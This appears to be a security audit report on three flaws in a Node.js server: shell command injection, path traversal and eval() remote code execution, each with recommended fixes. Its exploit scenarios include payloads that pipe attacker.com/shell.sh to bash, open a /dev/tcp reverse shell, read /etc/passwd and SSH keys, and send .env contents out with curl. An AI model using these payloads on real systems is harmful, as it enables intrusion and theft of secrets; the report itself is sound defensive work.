## Vuln 1: Command Injection — `src/index.js` (committed, `/api/ping` endpoint)

* **Severity:** High
* **Category:** command\_injection
* **Confidence:** 9/10

**Description:**
The `/api/ping` endpoint, introduced in commit `f971230`, reads the `host` query parameter from an unauthenticated GET request and interpolates it directly into a shell command string passed to `child_process.exec()`. Because `exec()` invokes `/bin/sh -c`, all standard shell metacharacters are interpreted without restriction.

```javascript
// src/index.js — committed state
const { exec } = require('child_process');
// ...
} else if (req.method === 'GET' && url.pathname === '/api/ping') {
  const host = url.searchParams.get('host');
  exec(`ping -c 1 ${host}`, (err, stdout) => {   // ← user input injected here
    res.writeHead(200);
    res.end(JSON.stringify({ output: stdout }));
  });
```

**Exploit Scenario:**
An unauthenticated attacker sends:
```
GET /api/ping?host=127.0.0.1;cat+/etc/passwd HTTP/1.1
```
The shell executes `ping -c 1 127.0.0.1; cat /etc/passwd`. The output of the second command is returned in the JSON response. More severe escalation:
```
GET /api/ping?host=x;curl+http://attacker.com/shell.sh|bash
GET /api/ping?host=$(whoami)
```
No authentication, no sanitization, and no use of `execFile()` or argument arrays is in place.

**Recommendation:**
Replace `exec()` with `execFile('ping', ['-c', '1', host], ...)` and validate `host` against a strict allowlist (hostname/IPv4/IPv6 regex) before use. Reject any input that fails validation with a 400 response.

## Vuln 2: Path Traversal / Arbitrary File Read — `src/index.js` (committed, `/api/file` endpoint)

* **Severity:** High
* **Category:** path\_traversal
* **Confidence:** 9/10

**Description:**
The `/api/file` endpoint, introduced in commit `f971230`, accepts a `file` query parameter from an unauthenticated GET request and constructs a filesystem path using `path.join(__dirname, file)`. Node.js `path.join()` resolves `..` components, so a value of `../../etc/passwd` produces a final path of `/etc/passwd`. The file is then read synchronously and returned to the caller with no authentication, no path confinement check, and no error boundary.

```javascript
// src/index.js — committed state
const fs = require('fs');
const path = require('path');
// ...
} else if (req.method === 'GET' && url.pathname === '/api/file') {
  const file = url.searchParams.get('file');
  const filePath = path.join(__dirname, file);     // ← traversal not prevented
  const contents = fs.readFileSync(filePath, 'utf8');
  res.writeHead(200);
  res.end(JSON.stringify({ contents }));
```

**Exploit Scenario:**
```
GET /api/file?file=../../etc/passwd HTTP/1.1
GET /api/file?file=../.env
GET /api/file?file=../../home/ubuntu/.ssh/id_rsa
```
The attacker can read any file readable by the Node.js process user — including environment files, SSH keys, and application secrets. No special tooling is required; a plain `curl` suffices.

**Recommendation:**
After calling `path.join()`, verify the resolved path starts with the intended base directory before reading:
```javascript
const base = path.resolve(__dirname, 'public');  // intended root
const resolved = path.resolve(base, file);
if (!resolved.startsWith(base + path.sep)) {
  res.writeHead(403);
  return res.end(JSON.stringify({ error: 'Access denied' }));
}
```
Also maintain a strict allowlist of readable files if the use case permits.

## Vuln 3: Remote Code Execution via `eval()` — `src/index.js` (current working tree, `/api/search` endpoint)

* **Severity:** Critical
* **Category:** eval\_injection / rce
* **Confidence:** 10/10

**Description:**
The current state of `src/index.js` on this branch (additional changes on top of the committed state) introduces a `/api/search` endpoint that passes the raw `q` query parameter directly into `eval()`. Node.js `eval()` executes arbitrary JavaScript in the server process with full access to `require`, `process`, the filesystem, and the network. This endpoint is unauthenticated.

```javascript
// src/index.js — current working tree
} else if (req.method === 'GET' && url.pathname === '/api/search') {
  const query = url.searchParams.get('q');
  const filter = eval('(' + query + ')');   // ← untrusted user input passed to eval()
  res.writeHead(200);
  res.end(JSON.stringify({ results: filter }));
```

**Exploit Scenario:**
Read arbitrary files:
```
GET /api/search?q=require('fs').readFileSync('/etc/passwd','utf8')
```
Spawn a reverse shell:
```
GET /api/search?q=require('child_process').exec('bash+-i+>&+/dev/tcp/attacker.com/4444+0>&1')
```
Exfiltrate secrets via HTTP callback:
```
GET /api/search?q=require('child_process').execSync('curl+http://attacker.com/?d=$(cat+.env|base64)').toString()
```
All three requests execute synchronously in the server process. The result (or error) is returned directly in the JSON response, making in-band exfiltration trivial without an out-of-band channel. This is full, unauthenticated, one-request RCE.

**Recommendation:**
Remove `eval()` entirely. Implement a safe, data-driven filtering approach with explicitly parsed and validated operators:
```javascript
const ALLOWED_FIELDS = new Set(['name', 'status', 'type']);
const q = url.searchParams.get('q') || '';
const [field, value] = q.split(':');
if (!ALLOWED_FIELDS.has(field)) {
  res.writeHead(400);
  return res.end(JSON.stringify({ error: 'Invalid filter' }));
}
// apply filter safely using the parsed field/value pair
```
